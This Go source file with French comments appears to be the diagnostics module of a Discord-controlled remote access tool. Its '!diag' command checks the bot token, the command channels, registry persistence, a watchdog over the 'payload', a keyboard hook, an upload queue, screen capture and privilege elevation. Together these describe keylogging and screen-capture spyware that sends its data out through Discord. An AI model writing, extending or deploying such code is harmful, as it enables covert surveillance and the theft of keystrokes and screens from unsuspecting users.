// diag.go — autotest à distance.
//
// `!diag` vérifie ce qui doit être vrai sur une machine fraîche : jeton, salon,
// salons créés, dossier de travail, persistance, watchdog, crochet clavier,
// file d'attente, capture d'écran. Une ligne par point, ✅ ou ❌ — c'est la
// commande à taper en premier quand « il n'y a rien dans le salon ».
package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// diagLine formate une vérification.
func diagLine(ok bool, label, detail string) string {
	mark := "❌"
	if ok {
		mark = "✅"
	}
	if detail == "" {
		return fmt.Sprintf("%s %s", mark, label)
	}
	return fmt.Sprintf("%s %s — %s", mark, label, detail)
}

// runDiag compose le rapport d'autotest.
func runDiag() string {
	var b strings.Builder
	b.WriteString("**Autotest — " + hostname() + "**\n```\n")

	// 1. Configuration.
	b.WriteString(diagLine(cfg.BotToken != "", "jeton bot", yesNo(cfg.BotToken != "")) + "\n")
	b.WriteString(diagLine(cfg.GuildID != "", "serveur (guild)", cfg.GuildID) + "\n")

	// 2. Salon de commande.
	ch := targetChannel()
	detail := ch
	if ch == "" {
		detail = "non résolu"
	}
	b.WriteString(diagLine(ch != "", "salon de commande", detail) + "\n")

	// 3. Salons de la machine.
	n := channelsReady()
	b.WriteString(diagLine(n >= 12, "salons", fmt.Sprintf("%d/12", n)) + "\n")

	// 4. Dossier de travail inscriptible.
	wd := workDir()
	probe := filepath.Join(wd, ".diag")
	werr := os.WriteFile(probe, []byte("x"), 0600)
	_ = os.Remove(probe)
	b.WriteString(diagLine(werr == nil, "dossier de travail", shortPath(wd)) + "\n")

	// 5. Persistance.
	ps := persistStatus()
	b.WriteString(diagLine(ps != "absente" && ps != "registre inaccessible", "persistance", truncate(ps, 60)) + "\n")

	// 6. Watchdog.
	watch := payloadAlive()
	b.WriteString(diagLine(watch, "instance active", "") + "\n")

	// 7. Clavier.
	b.WriteString(diagLine(hookActive.Load(), "crochet clavier", onOff(hookActive.Load())) + "\n")

	// 8. File d'attente.
	queued := 0
	if entries, err := os.ReadDir(queueDir()); err == nil {
		queued = len(entries)
	}
	b.WriteString(diagLine(queued < queueMaxFiles, "file d'envoi", fmt.Sprintf("%d fichier(s)", queued)) + "\n")

	// 9. Capture d'écran (rapide, un seul moniteur).
	t0 := time.Now()
	shots := captureScreensPNG()
	ok := len(shots) > 0 && len(shots[0]) > 1024
	b.WriteString(diagLine(ok, "capture d'écran",
		fmt.Sprintf("%d écran(s), %d ms", len(shots), time.Since(t0).Milliseconds())) + "\n")

	// 10. Élévation.
	b.WriteString(diagLine(isElevated(), "privilèges", privLabel()) + "\n")

	b.WriteString("```")
	return b.String()
}

// shortPath raccourcit un chemin pour l'affichage.
func shortPath(p string) string {
	if len(p) <= 48 {
		return p
	}
	return "…" + p[len(p)-47:]
}

func onOff(v bool) string {
	if v {
		return "actif"
	}
	return "inactif"
}
